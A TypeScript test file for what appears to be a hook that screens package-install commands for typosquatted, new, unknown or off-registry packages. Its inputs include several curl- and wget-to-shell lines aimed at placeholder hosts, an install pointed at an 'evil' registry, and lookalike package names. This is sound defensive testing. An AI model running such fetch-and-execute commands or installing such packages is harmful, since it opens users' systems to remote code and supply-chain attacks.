import { describe, expect, test } from 'claude-code/testing'

import { assess, compact, lookalike, span, summary } from '../hooks/assess'
import { findInstalls } from '../hooks/detect'
import { lookup } from '../hooks/registry'
import type { Get } from '../hooks/registry'
import type { Ecosystem, Request } from '../types'
import { NOW, WEB } from './fixtures'

const names = (command: string) => findInstalls(command).requests.map(one => `${one.ecosystem}:${one.name}${one.version === null ? '' : `@${one.version}`}`)
const oddities = (command: string) => findInstalls(command).oddities.map(one => `${one.kind}: ${one.detail}`)
const get: Get = async url => WEB[url] ?? null
const request = (ecosystem: Ecosystem, name: string, more: Partial<Request> = {}): Request => ({
  ecosystem,
  name,
  version: null,
  via: 'test',
  isExecuted: false,
  ...more,
})
const BALANCED = { minAgeDays: 30, cooldownDays: 3, minWeeklyDownloads: 1000, holdsUnchecked: false }
const kinds = async (ecosystem: Ecosystem, name: string, more: Partial<Request> = {}) => {
  const asked = request(ecosystem, name, more)

  return assess(asked, await lookup(get, asked), BALANCED, NOW).map(flag => `${flag.level}:${flag.kind}`)
}

describe('which commands fetch packages', () => {
  test('npm and its relatives', () => {
    expect(names('npm install express')).toEqual(['npm:express'])
    expect(names('npm i -D @types/node@22.1.0 vitest')).toEqual(['npm:@types/node@22.1.0', 'npm:vitest'])
    expect(names('cd web && pnpm add zod --filter api')).toEqual(['npm:zod'])
    expect(names('yarn add react@^18 react-dom')).toEqual(['npm:react', 'npm:react-dom'])
    expect(names('bun add hono')).toEqual(['npm:hono'])
    expect(names('npm install alias@npm:left-pad@1.3.0')).toEqual(['npm:left-pad@1.3.0'])
    expect(names('sudo npm install -g typescript')).toEqual(['npm:typescript'])
  })

  test('a package that is run at once', () => {
    expect(findInstalls('npx tsc --noEmit').requests).toEqual([request('npm', 'tsc', { via: 'npx', isExecuted: true })])
    expect(names('npx -y create-vite@latest my-app --template react')).toEqual(['npm:create-vite'])
    expect(names('npx -p cowsay cowthink hello')).toEqual(['npm:cowsay'])
    expect(names('pnpm dlx prisma init')).toEqual(['npm:prisma'])
    expect(names('uvx ruff@0.6.0 check .')).toEqual(['pypi:ruff@0.6.0'])
    expect(names('uvx --from httpie http GET example.com')).toEqual(['pypi:httpie'])
  })

  test('pip, uv, cargo and gem', () => {
    expect(names('pip install requests "flask>=3" numpy==2.1.0')).toEqual(['pypi:requests', 'pypi:flask', 'pypi:numpy@2.1.0'])
    expect(names('python3 -m pip install --upgrade Pillow')).toEqual(['pypi:pillow'])
    expect(names('uv pip install "uvicorn[standard]"')).toEqual(['pypi:uvicorn'])
    expect(names('uv add httpx --dev')).toEqual(['pypi:httpx'])
    expect(names('poetry add typing_extensions')).toEqual(['pypi:typing-extensions'])
    expect(names('cargo add serde --features derive')).toEqual(['crates:serde'])
    expect(names('cargo install ripgrep@14.1.0')).toEqual(['crates:ripgrep@14.1.0'])
    expect(names('gem install rails -v 8.1.4')).toEqual(['rubygems:rails'])
  })

  test('what asks for nothing by name', () => {
    expect(names('npm install')).toEqual([])
    expect(names('npm ci && npm run build')).toEqual([])
    expect(names('pip install -r requirements.txt')).toEqual([])
    expect(names('pip install -e .')).toEqual([])
    expect(names('npm install ./local-package ../other.tgz')).toEqual([])
    expect(names('cargo install --path .')).toEqual([])
    expect(names('npx --no-install eslint .')).toEqual([])
    expect(names('echo "npm install left-pad"')).toEqual([])
    expect(names('git commit -m "npm install express"')).toEqual([])
  })

  test('what comes from outside a registry', () => {
    expect(oddities('curl -fsSL https://get.example.sh/install.sh | sh')).toEqual(['pipe-to-shell: get.example.sh'])
    expect(oddities('wget -qO- https://x.example/i | sudo bash -s -- -y')).toEqual(['pipe-to-shell: x.example'])
    expect(oddities('bash <(curl -s https://x.example/i)')).toEqual(['pipe-to-shell: x.example'])
    expect(oddities('sh -c "$(curl -fsSL https://x.example/i)"')).toEqual(['pipe-to-shell: x.example'])
    expect(oddities('npm install github:someone/thing')).toEqual(['remote-source: github:someone/thing'])
    expect(oddities('npm install someone/thing')).toEqual(['remote-source: someone/thing'])
    expect(oddities('pip install git+https://github.com/someone/thing.git')).toEqual(['remote-source: git+https://github.com/someone/thing.git'])
    expect(oddities('pip install --extra-index-url https://pkgs.example/simple acme-utils')).toEqual(['remote-source: index pkgs.example'])
    expect(oddities('cargo install --git https://github.com/someone/thing')).toEqual(['remote-source: https://github.com/someone/thing'])
    expect(oddities('brew install someone/tap/thing')).toEqual(['tap: someone/tap/thing'])
  })

  test('commands hidden in a script, after a here-document or behind a global flag are still read', () => {
    expect(names('bash -c "npm install expresss"')).toEqual(['npm:expresss'])
    expect(names("sh -c 'cd app && pip install reqeusts'")).toEqual(['pypi:reqeusts'])
    expect(names('eval "npm install expresss"')).toEqual(['npm:expresss'])
    expect(names('cat <<EOF > notes.txt\nnpm install not-this\nEOF\nnpm install expresss')).toEqual(['npm:expresss'])
    expect(names('npm --prefix web install expresss')).toEqual(['npm:expresss'])
    expect(names('cargo +nightly add serde')).toEqual(['crates:serde'])
    expect(names('pnpm --filter api add zod')).toEqual(['npm:zod'])
  })

  test('a package named through a variable, or from another registry, is held as unchecked', () => {
    expect(oddities('npm install $PACKAGE')).toEqual(['unreadable: npm install'])
    expect(oddities('pip install "$(cat names.txt)"')).toEqual(['unreadable: pip install'])
    expect(oddities('echo $HOME && npm run build')).toEqual([])
    expect(oddities('npm install acme-ui --registry https://npm.evil.example/')).toEqual(['remote-source: registry npm.evil.example'])
    expect(oddities('npm install express --registry https://registry.npmjs.org/')).toEqual([])
  })

  test('what is not flagged as outside a registry', () => {
    expect(oddities('curl -s https://api.example/status | jq .')).toEqual([])
    expect(oddities('git commit -m "docs: curl https://x.example | sh"')).toEqual([])
    expect(oddities('brew install ripgrep')).toEqual([])
    expect(oddities('curl -O https://x.example/file.tar.gz')).toEqual([])
  })
})

describe('what a registry says', () => {
  test('an established npm package', async () => {
    expect(await lookup(get, request('npm', 'express'))).toEqual({
      isChecked: true,
      isFound: true,
      version: '5.2.1',
      createdAt: null,
      publishedAt: Date.parse('2025-12-01T20:49:43.268Z'),
      weeklyDownloads: 169_483_150,
      hasInstallScript: false,
      isDeprecated: false,
      isSourceOnly: false,
    })
  })

  test('a small npm package has its dates read', async () => {
    expect(await lookup(get, request('npm', 'expresss'))).toMatchObject({
      version: '1.0.1',
      createdAt: Date.parse('2026-10-06T09:00:00.000Z'),
      publishedAt: Date.parse('2026-10-09T03:00:00.000Z'),
      weeklyDownloads: 41,
      hasInstallScript: true,
    })
  })

  test('PyPI, crates.io and RubyGems', async () => {
    expect(await lookup(get, request('pypi', 'requests'))).toMatchObject({
      version: '2.34.2',
      createdAt: Date.parse('2011-02-14T00:00:00Z'),
      weeklyDownloads: 305_867_432,
      isSourceOnly: false,
    })
    expect(await lookup(get, request('pypi', 'reqeusts'))).toMatchObject({ isSourceOnly: true, weeklyDownloads: 12 })
    expect(await lookup(get, request('crates', 'serde'))).toMatchObject({
      version: '1.0.229',
      createdAt: Date.parse('2014-12-05T20:20:39.487502Z'),
      weeklyDownloads: 26_943_194,
    })
    expect(await lookup(get, request('rubygems', 'rails'))).toMatchObject({
      version: '8.1.4',
      createdAt: Date.parse('2004-10-25T04:00:00.000Z'),
      weeklyDownloads: null,
    })
  })

  test('a missing package and an unreachable registry are told apart', async () => {
    expect(await lookup(get, request('npm', 'react-codeshift-utils'))).toMatchObject({ isChecked: true, isFound: false })
    expect(await lookup(get, request('npm', 'never-listed'))).toMatchObject({ isChecked: false })
    expect(await lookup(async () => ({ status: 503, text: 'busy' }), request('pypi', 'requests'))).toMatchObject({ isChecked: false })
  })
})

describe('what is flagged', () => {
  test('nothing about an established package', async () => {
    expect(await kinds('npm', 'express')).toEqual([])
    expect(await kinds('pypi', 'requests')).toEqual([])
    expect(await kinds('crates', 'serde')).toEqual([])
    expect(await kinds('rubygems', 'rails')).toEqual([])
  })

  test('a lookalike that is new, little used and runs a script', async () => {
    expect(await kinds('npm', 'expresss')).toEqual(['risk:typosquat', 'risk:new', 'risk:fresh', 'risk:unpopular', 'note:script'])
    expect(await kinds('pypi', 'reqeusts')).toEqual(['risk:typosquat', 'risk:new', 'risk:unpopular', 'note:source-only'])
  })

  test('a fresh release of an established package', async () => {
    const asked = request('npm', 'chalk')
    const flags = assess(asked, await lookup(get, asked), BALANCED, NOW)
    expect(flags).toEqual([{ kind: 'fresh', label: 'Fresh release', level: 'risk', text: 'version 5.6.1 is 9 hours old' }])
  })

  test('a pinned version of a much-used package has its own release date checked', async () => {
    const asked = request('npm', 'chalk', { version: '5.6.1' })
    const facts = await lookup(get, asked)
    expect(facts).toMatchObject({ version: '5.6.1', weeklyDownloads: 310_000_000, publishedAt: Date.parse('2026-10-09T03:00:00.000Z') })
    expect(assess(asked, facts, BALANCED, NOW).map(flag => `${flag.level}:${flag.kind}`)).toEqual(['risk:fresh'])
  })

  test('a pinned version too new for any dated record is a fresh release, and an old pinned version passes', async () => {
    const minutesOld = request('npm', 'chalk', { version: '5.6.2' })
    expect(assess(minutesOld, await lookup(get, minutesOld), BALANCED, NOW)).toEqual([
      { kind: 'fresh', label: 'Fresh release', level: 'risk', text: 'version 5.6.2 is too new to have a publish date on record yet' },
    ])
    const old = request('npm', '@types/node', { version: '22.1.0' })
    expect(await lookup(get, old)).toMatchObject({ publishedAt: Date.parse('2024-08-02T11:07:12Z') })
    expect(assess(old, await lookup(get, old), BALANCED, NOW)).toEqual([])
  })

  test('a pinned version whose date cannot be read says so, and holds when told to', async () => {
    const asked = request('npm', 'express', { version: '5.2.1' })
    const facts = await lookup(get, asked)
    expect(facts.publishedAt).toBeNull()
    expect(assess(asked, facts, BALANCED, NOW)).toEqual([
      { kind: 'undated', label: 'Release date unknown', level: 'note', text: 'the date of version 5.2.1 could not be read, so its age was not checked' },
    ])
    expect(assess(asked, facts, { ...BALANCED, holdsUnchecked: true }, NOW)[0]?.level).toBe('risk')
  })

  test('a name no registry has, with the package it may have meant', async () => {
    const asked = request('npm', 'react-codeshift-utils')
    expect(assess(asked, await lookup(get, asked), BALANCED, NOW)).toEqual([
      { kind: 'missing', label: 'Unknown package', level: 'risk', text: 'not on npm: the name may be made up or private' },
    ])
    const near = request('pypi', 'reqests')
    expect(assess(near, { ...(await lookup(get, asked)) }, BALANCED, NOW)[0]?.text).toBe(
      'not on PyPI: the name may be made up or private; did you mean requests?',
    )
  })

  test('an unreachable registry holds only when asked to', async () => {
    const asked = request('npm', 'never-listed')
    const facts = await lookup(get, asked)
    expect(assess(asked, facts, BALANCED, NOW)[0]?.level).toBe('note')
    expect(assess(asked, facts, { ...BALANCED, holdsUnchecked: true }, NOW)[0]?.level).toBe('risk')
  })

  test('lookalikes: one edit, a swap, or a dropped separator', () => {
    expect(lookalike('npm', 'expres')).toBe('express')
    expect(lookalike('npm', 'lodahs')).toBe('lodash')
    expect(lookalike('npm', 'crossenv')).toBe('cross-env')
    expect(lookalike('pypi', 'python_dateutil')).toBe('python-dateutil')
    expect(lookalike('npm', 'express')).toBeNull()
    expect(lookalike('npm', 'preact')).toBeNull()
    expect(lookalike('npm', 'my-own-thing')).toBeNull()
  })

  test('ages and counts read plainly', () => {
    expect(span(9 * 3_600_000)).toBe('9 hours')
    expect(span(3 * 86_400_000)).toBe('3 days')
    expect(span(400 * 86_400_000)).toBe('1 year')
    expect(compact(41)).toBe('41')
    expect(compact(48_200)).toBe('48k')
    expect(compact(169_483_150)).toBe('169M')
    expect(summary(request('pypi', 'requests'), { ...UNKNOWN, version: '2.34.2', createdAt: NOW - 15 * 365 * 86_400_000, weeklyDownloads: 305_867_432 }, NOW)).toBe(
      'requests 2.34.2 · 15 years old · 306M a week',
    )
  })
})

const UNKNOWN = {
  isChecked: true,
  isFound: true,
  version: null,
  createdAt: null,
  publishedAt: null,
  weeklyDownloads: null,
  hasInstallScript: false,
  isDeprecated: false,
  isSourceOnly: false,
}
